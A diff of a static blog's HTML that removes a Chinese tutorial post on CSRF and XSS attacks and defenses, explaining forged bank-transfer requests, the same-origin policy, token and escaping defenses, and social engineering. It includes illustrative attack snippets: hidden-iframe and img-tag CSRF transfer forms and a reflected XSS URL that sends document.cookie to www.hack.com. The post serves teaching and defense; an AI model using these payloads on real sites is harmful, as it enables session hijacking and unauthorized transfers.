 <div class="ds-thread" data-thread-key="post-mark/sublime关闭分组" data-title="sublime关闭分组" data-url="undefined"></div>
-<!-- 多说评论框 end -->
-<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
-<script type="text/javascript">
-var duoshuoQuery = {short_name:"yangdage"};
-(function() {
-  var ds = document.createElement('script');
-  ds.type = 'text/javascript';ds.async = true;
-  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-  ds.charset = 'UTF-8';
-  (document.getElementsByTagName('head')[0] 
-   || document.getElementsByTagName('body')[0]).appendChild(ds);
-})();
-</script>
-<!-- 多说公共JS代码 end -->
-
-<!-- 搜索引擎优化 start-->
-
-<!-- 搜索引擎优化 end-->
-  
-    <article id="post-mark/csrf和xss攻击与防御" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/blog/mark/mark/csrf和xss攻击与防御.html" class="article-date">
-  <time datetime="2015-04-05T16:00:00.000Z" itemprop="datePublished">2015-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/blog/categories/mark/">mark</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/mark/mark/csrf和xss攻击与防御.html">CSRF和XSS防御与攻击</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h3><p>CSRF(Cross-Site Request Forgery)，翻译过来叫做跨站请求伪造。是一种挟制终端用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。<br>攻击者只要借助少许的社会工程诡计，例如通过电子邮件或者是聊天软件发送的链接，攻击者就能迫使<br>一个Web应用程序的用户去执行攻击者精心构造的操作。</p>
-<h4 id="实例解释"><a href="#实例解释" class="headerlink" title="实例解释"></a>实例解释</h4><p>假设某用户登录网络银行去查看其存款余额，他没有退出网络银行系统就去了自己喜欢的论坛去逛逛，如果攻击者在论坛事先已经构造了一个恶意转账的链接并诱使该用户点击了该链接，那么该用户在网络银行帐户中的资金就有可能被转移到攻击者指定的帐户中。</p>
-<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>当CSRF针对普通用户发动攻击时，将对终端用户的数据和操作指令构成严重的威胁，危及个人隐私及财产；当受攻击的终端用户具有管理员帐户的时候，CSRF攻击可能会危及整个Web应用程序。</p>
-<h3 id="CSRF成因"><a href="#CSRF成因" class="headerlink" title="CSRF成因"></a>CSRF成因</h3><ul>
-<li>Web浏览器对于Cookie和HTTP身份验证信息之类的会话信息的处理方式</li>
-</ul>
-<p>浏览器会自动地发送标识用户对话的信息，而无需用户干预。换句话说，<br>当浏览器发送这些身份信息的时候，用户根本感觉不到。</p>
-<ul>
-<li>攻击者对Web应用程序URL的了解</li>
-</ul>
-<p>分析请求URL或者通过访问该应用程序并查看嵌入HTML/JavaScript中的URL<br>以及表单来了解应用程序有关的URL、参数和容许值。</p>
-<ul>
-<li>WEB应用会话管理对浏览器的透明性</li>
-</ul>
-<p>浏览器可以访问会话管理信息，如果Web应用程序完全依赖于这类信息来识别<br>一个用户会话，这就为跨站请求伪造创造了条件。</p>
-<ul>
-<li>各种能够引发资源请求HTML标签</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;link&gt;,&lt;img&gt;,&lt;iframe&gt;,&lt;script&gt;等等可以跨域引用第三方资源的标签，这些带有</div><div class="line">src属性的标签每次加载是就相当于触发一次GET请求。</div></pre></td></tr></table></figure>
-<h4 id="CSRF触发条件"><a href="#CSRF触发条件" class="headerlink" title="CSRF触发条件"></a>CSRF触发条件</h4><ul>
-<li>1.登陆信任网站，本地存有用户cookie</li>
-<li>2.没有登出信任网站，访问危险网站。</li>
-</ul>
-<p>被攻击用户浏览器在用户不知明的情况下被迫向被攻击站点发起伪造的请求。<br>请求过程会带上被攻击用户的身份认证标识(cookie)。</p>
-<p><img src="https://raw.githubusercontent.com/yangdage/images/master/20150406/2015040600.jpg" alt="csrf"></p>
-<h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><p>案例一：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">银行网站A，它以GET请求来完成银行转账的操作:</div><div class="line">	</div><div class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</div><div class="line"></div><div class="line"></div><div class="line">危险网站B，它里面有一段HTML的代码如下：</div><div class="line"></div><div class="line">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</div></pre></td></tr></table></figure>
-<p>案例二：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">银行网站A的WEB表单如下（后台接收按request.getParameter()接收参数）:</div><div class="line">	</div><div class="line">&lt;form action=&quot;Transfer.php&quot; method=&quot;GET&quot;&gt;</div><div class="line">	&lt;p&gt;ToBankId: &lt;input type=&quot;text&quot; name=&quot;toBankId&quot; /&gt;&lt;/p&gt;</div><div class="line">	&lt;p&gt;Money: &lt;input type=&quot;text&quot; name=&quot;money&quot; /&gt;&lt;/p&gt;</div><div class="line">	&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Transfer&quot; /&gt;&lt;/p&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">危险网站B，它里面有同样一段HTML的代码如下：</div><div class="line"></div><div class="line">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</div></pre></td></tr></table></figure>
-<p>案例三:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">银行网站A的WEB表单如下（后台接收限制POST方式接收接收参数）:</div><div class="line">	</div><div class="line">&lt;form action=&quot;Transfer.php&quot; method=&quot;POST&quot;&gt;</div><div class="line">	&lt;p&gt;ToBankId: &lt;input type=&quot;text&quot; name=&quot;toBankId&quot; /&gt;&lt;/p&gt;</div><div class="line">	&lt;p&gt;Money: &lt;input type=&quot;text&quot; name=&quot;money&quot; /&gt;&lt;/p&gt;</div><div class="line">	&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Transfer&quot; /&gt;&lt;/p&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">危险网站B也跟着改进了一下代码:	</div><div class="line"></div><div class="line">&lt;iframe name=&quot;ifr_trans&quot; display=&quot;none&quot;&gt;</div><div class="line">    &lt;form method=&quot;POST&quot; name=&quot;transfer&quot;　action=&quot;http://www.myBank.com/Transfer.php&quot;&gt;</div><div class="line">        &lt;input type=&quot;hidden&quot; name=&quot;toBankId&quot; value=&quot;11&quot;&gt;</div><div class="line">        &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000&quot;&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">&lt;/iframe&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">function steal()&#123;</div><div class="line">     iframe = document.frames[&quot;ifr_trans&quot;];</div><div class="line">     iframe.document.Submit(&quot;transfer&quot;);</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<h3 id="用户防御意识"><a href="#用户防御意识" class="headerlink" title="用户防御意识"></a>用户防御意识</h3><ul>
-<li>使用完Web应用程序之后记得退出登录</li>
-<li>不要让浏览器保存敏感网站用户名/密码</li>
-<li>不要随便点击陌生人发的未知链接</li>
-<li>不要使用同一浏览器同时访问敏感的应用程序和随意冲浪</li>
-<li>小心查看支持HTM格式的邮件</li>
-</ul>
-<h3 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h3><ul>
-<li>1.过滤所有用户发布的链接（下下策）</li>
-</ul>
-<p>攻击者不一定要从站内发起请求，而且就算从站内发起请求，<br>途径也远远不知链接一条。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">嵌入危险网站的图片引用触发攻击请求：</div><div class="line">&lt;img src=&quot;http://www.xxx.com/feedback?content=xxx&quot; /&gt;</div></pre></td></tr></table></figure>
-<ul>
-<li>2.请求头Referer检测(防小白HACKER)</li>
-</ul>
-<p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站。</p>
-<p>验证 Referer ，就是把安全性都依赖于第三方（即浏览器）来保障，<br>从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或<br>FF2，有一些方法可以随意篡改 Referer 值。</p>
-<ul>
-<li>3.请求令牌token（高级一点）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">i.服务器端生成随机字符串，作为令牌（token），保存在Session里。</div><div class="line">ii.请求的页面用隐藏域形式存储token。</div><div class="line">iii.token与其他信息一起提交。</div><div class="line">iv.服务断比较接收到的令牌与Session中的令牌，相同才处理请求。</div><div class="line">   否则返回失败状态。</div><div class="line">v.正常处理完请求一定一定一定要清理token。</div></pre></td></tr></table></figure>
-<ul>
-<li>4.高级请求令牌（破解难度大，影响用户体验）</li>
-</ul>
-<p>图片验证码等,短信验证码,语音验证码等等</p>
-<ul>
-<li>5.非主流处理方式</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">i.尽量使用POST而不是GET</div><div class="line">(POST可以通过JavaScript进行模仿,相对提高了攻击难度)</div><div class="line"></div><div class="line">ii.跳转中间确认页</div></pre></td></tr></table></figure>
-<h3 id="告诉你一个不好的消息"><a href="#告诉你一个不好的消息" class="headerlink" title="告诉你一个不好的消息"></a>告诉你一个不好的消息</h3><p><strong>事实上目前无法从根本解决CSRF防御问题，只能尽量构造更多障碍，提高攻击难度，构造更多障碍的同时会影响正常用户的用户体验。</strong></p>
-<h3 id="浏览器同源策略"><a href="#浏览器同源策略" class="headerlink" title="浏览器同源策略"></a>浏览器同源策略</h3><p>同源策略，它是由Netscape提出的一个著名的安全策略。现在所有支持JavaScript的浏览器都会使用这个策略。所谓同源是指，域名，协议，端口相同。</p>
-<p>现有链接<strong><a href="http://www.xxx.com/1.js" target="_blank" rel="external">http://www.xxx.com/1.js</a></strong>，下表列出相关链接是否同源情况</p>
-<table>
-<thead>
-<tr>
-<th>站点/链接</th>
-<th>是否同源</th>
-<th>判断依据</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><a href="https://www.xxx.com" target="_blank" rel="external">https://www.xxx.com</a></td>
-<td>不同源</td>
-<td>协议不同</td>
-</tr>
-<tr>
-<td><a href="http://m.xxx.com" target="_blank" rel="external">http://m.xxx.com</a></td>
-<td>不同源</td>
-<td>子域名不同</td>
-</tr>
-<tr>
-<td><a href="http://xxx.com" target="_blank" rel="external">http://xxx.com</a></td>
-<td>不同源</td>
-<td>域名不同，此为顶级域</td>
-</tr>
-<tr>
-<td><a href="http://www.xxx.com:9999" target="_blank" rel="external">http://www.xxx.com:9999</a></td>
-<td>不同源</td>
-<td>端口不同</td>
-</tr>
-<tr>
-<td><a href="http://www.xxx.com/a.js" target="_blank" rel="external">http://www.xxx.com/a.js</a></td>
-<td>同源</td>
-<td>域名，协议，端口相同</td>
-</tr>
-</tbody>
-</table>
-<h3 id="XSS注入攻击"><a href="#XSS注入攻击" class="headerlink" title="XSS注入攻击"></a>XSS注入攻击</h3><p>XSS(Cross Site Scripting)，跨站脚本攻击，与SQL注入攻击类似，恶意用户，在一些公共区域（例如，论坛，评论）输入一些文本，这些文本被其它用户看到，但这些文本不仅仅是他们要输入的文本，同时还包括一些可以在客户端执行的脚本。</p>
-<ul>
-<li>1.反射型XSS</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/test.jsp页面内容如下：</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">页面内容：&lt;%=request.getParameter(&quot;content&quot;)%&gt;</div><div class="line">&lt;/body&gt;</div><div class="line"></div><div class="line">反射注入请求URL:</div><div class="line"></div><div class="line">http://www.xxx.com/test.jsp?content=&lt;script&gt;window.open(&quot;www.hack.com?param=&quot;+document.cookie)&lt;/script&gt;</div></pre></td></tr></table></figure>
-<ul>
-<li>2.持久型XSS</li>
-</ul>
-<p>持久型XSS攻击一般存在于展示用户输入的页面（如评论页），这些数据会存储到网站服务器后台数据库，所以也叫存储型XSS。</p>
-<p>以下是个人测试网票网的评论页存在持久型XSS注入的截图。</p>
-<p><img src="https://raw.githubusercontent.com/yangdage/images/master/20150406/2015040601.png" alt="csrf"></p>
-<p><img src="https://raw.githubusercontent.com/yangdage/images/master/20150406/2015040602.png" alt="csrf"></p>
-<h3 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h3><p>对用户提交的数据中的html标签特殊字符编码处理。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">switch(c) &#123;</div><div class="line">case &apos;&amp;&apos;:</div><div class="line">    return&quot;&amp;amp;&quot;;</div><div class="line">case &apos;&lt;&apos;:</div><div class="line">    return&quot;&amp;lt;&quot;;</div><div class="line">case &apos;&gt;&apos;:</div><div class="line">    return&quot;&amp;gt;&quot;;</div><div class="line">case &apos;&quot;&apos;:</div><div class="line">    return&quot;&amp;quot;&quot;;</div><div class="line">case &apos; &apos;:</div><div class="line">    return&quot;&amp;nbsp;&quot;;</div><div class="line">default:</div><div class="line">    return c +&quot;&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>java中处理方式:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">StringEscapeUtils.escapeHtml(<span class="string">"&lt;script&gt;alert('1111')&lt;/script&gt;"</span>);</div><div class="line"><span class="comment">//输出：&amp;lt;script&amp;gt;alert('1111')&amp;lt;/script&amp;gt;</span></div></pre></td></tr></table></figure>
-<h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>社会工程学以顺从你的意愿、满足你的欲望的方式，让你上当的一些方法、一门艺术与学问。<br>一种利用人的本能反应、好奇心、信任、贪便宜等弱点进行诸如欺骗、伤害等危害手段，获取自身利益的手法。</p>
-<p>社会工程攻击不是传统的信息安全的范畴，也被称为 “非传统信息安全”.</p>
-<p>信息安全预测：<br>“社会工程学是未来最大信息系统入侵与反入侵对抗领域，许多破坏力最大的行为是由于社会工程学<br>而不是黑客或破坏行为造成的。”</p>
-<p>近年代表应用：<br>1.免费下载软件中捆绑流氓软件<br>2.免费音乐中包含病毒<br>3.网络钓鱼<br>4.垃圾电子邮件中的恶意链接或间谍软件</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/mark/mark/csrf和xss攻击与防御.html" data-id="cjh8qs0sx0009ooj7ye19oygq" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!--
-
--->
-
-<!-- 多说评论框 start -->
-<div class="ds-thread" data-thread-key="post-mark/csrf和xss攻击与防御" data-title="CSRF和XSS防御与攻击" data-url="undefined"></div>
 <!-- 多说评论框 end -->
 <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 <script type="text/javascript">
@@ -1141,7 +1040,7 @@ var duoshuoQuery = {short_name:"yangdage"};
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2018/05/">五月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2018/03/">三月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2017/06/">六月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2017/04/">四月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2016/04/">四月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2016/03/">三月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/08/">八月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/05/">五月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/04/">四月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/03/">三月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/02/">二月 2015</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2018/05/">五月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2018/03/">三月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2017/06/">六月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2017/04/">四月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2016/05/">五月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2016/04/">四月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2016/03/">三月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/08/">八月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/05/">五月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/04/">四月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/03/">三月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/02/">二月 2015</a></li></ul>
     </div>
   </div>
 
